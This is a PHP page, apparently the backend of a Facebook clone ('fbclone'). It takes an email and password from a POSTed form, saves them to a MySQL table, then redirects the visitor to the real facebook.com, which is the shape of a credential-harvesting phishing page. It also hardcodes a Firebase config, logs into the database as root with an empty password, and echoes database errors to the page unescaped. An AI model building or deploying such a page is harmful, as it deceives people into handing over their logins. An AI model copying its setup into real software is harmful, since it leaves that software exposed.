<?php
// ----------------------
// PHP: CONNECT TO DATABASE
// ----------------------
$host = "localhost";
$user = "root";        // MySQL username
$pass = "";            // MySQL password
$dbname = "school_db"; // Database name

$conn = new mysqli($host, $user, $pass, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// ----------------------
// HANDLE FORM SUBMISSION
// ----------------------
$serverError = "";
$redirectToFacebook = false;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($email && $password) {
        $hashedPassword = hash('sha256', $password);
        $stmt = $conn->prepare("INSERT INTO students (email, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $email, $hashedPassword);

        if ($stmt->execute()) {
            // successful save → redirect after PHP + JS
            $redirectToFacebook = true;
        } else {
            $serverError = "Error: " . $stmt->error;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Index</title>
</head>
<body>

<!-- Your page content goes here -->
<h2>Index Page</h2>

<?php if ($serverError): ?>
  <p style="color:red;"><?php echo $serverError; ?></p>
<?php endif; ?>

<?php if ($redirectToFacebook): ?>
<script>
  window.location.href = "https://facebook.com";
</script>
<?php endif; ?>

<!-- ========================= -->
<!-- Firebase Analytics (ONLY) -->
<!-- ========================= -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";

  const firebaseConfig = {
    apiKey: "AIzaSyAhDxiStNDIOLBs9X6gKHljsTCGYGZHX-E",
    authDomain: "fbclone-68b0c.firebaseapp.com",
    databaseURL: "https://fbclone-68b0c-default-rtdb.firebaseio.com",
    projectId: "fbclone-68b0c",
    storageBucket: "fbclone-68b0c.firebasestorage.app",
    messagingSenderId: "398644417896",
    appId: "1:398644417896:web:6f46499270e1eb6a9172dd",
    measurementId: "G-GZD9M36FVH"
  };

  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
</script>

</body>
</html>
